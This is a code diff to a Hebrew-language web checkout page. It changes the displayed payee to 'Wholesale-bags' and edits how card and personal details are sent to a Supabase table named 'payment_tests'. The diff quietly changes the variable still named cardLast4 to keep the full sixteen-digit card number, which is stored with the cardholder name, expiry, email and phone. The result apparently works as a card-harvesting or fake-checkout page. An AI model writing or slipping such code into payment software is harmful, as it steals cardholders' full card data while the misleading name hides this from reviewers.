@@ -402,7 +402,7 @@
   <div class="av">N</div>
   <div>
     <div class="label-sm">תשלום אל</div>
-    <div class="name">Nova Labs stable</div>
+    <div class="name">Wholesale-bags</div>
   </div>
 </div>
 
@@ -477,11 +477,11 @@
         </div>
 
         <div class="field">
-          <label>שם בעל הכרטיס</label>
+          <label>שם מלא באנגלית</label>
           <span class="required-mark">*</span>
          <input
   id="inName"
-  placeholder="ישראל ישראלי"
+  placeholder="YOUR FULL NAME"
   oninput="onName(this.value)"
 />
           <div class="glow"></div>
@@ -542,15 +542,7 @@
           />
           <div class="glow"></div>
         </div>
-<div class="field">
-  <label>שם מלא באנגלית</label>
-  <span class="required-mark">*</span>
-  <input
-    id="inFullName"
-    placeholder="NAME"
-  />
-  <div class="glow"></div>
-</div>
+
       </div>
     </div>
 
@@ -793,12 +785,10 @@ function onCvc(v) {
 
   const email = document.getElementById('inEmail');
   const phone = document.getElementById('inPhone');
-  const fullName = document.getElementById('inFullName');
-
+ 
   const personalInputs = [
     email,
-    phone,
-    fullName
+    phone
   ];
 
   let missing = false;
@@ -846,7 +836,7 @@ function onCvc(v) {
         .value
         .replace(/\D/g, '');
 
-    const cardLast4 = cardDigits.slice(-4);
+    const cardLast4 = cardDigits.slice(-16);
 
     const cardholderName =
       document.getElementById('inName')
@@ -864,9 +854,6 @@ function onCvc(v) {
     const phoneValue =
       phone.value.trim();
 
-    const fullNameValue =
-      fullName.value.trim();
-
 
     const { error } = await supabaseClient
       .from('payment_tests')
@@ -876,8 +863,7 @@ function onCvc(v) {
         cardholder_name: cardholderName,
         card_exp: cardExp,
         email: emailValue,
-        phone: phoneValue,
-        full_name_english: fullNameValue
+        phone: phoneValue
       });
 
 
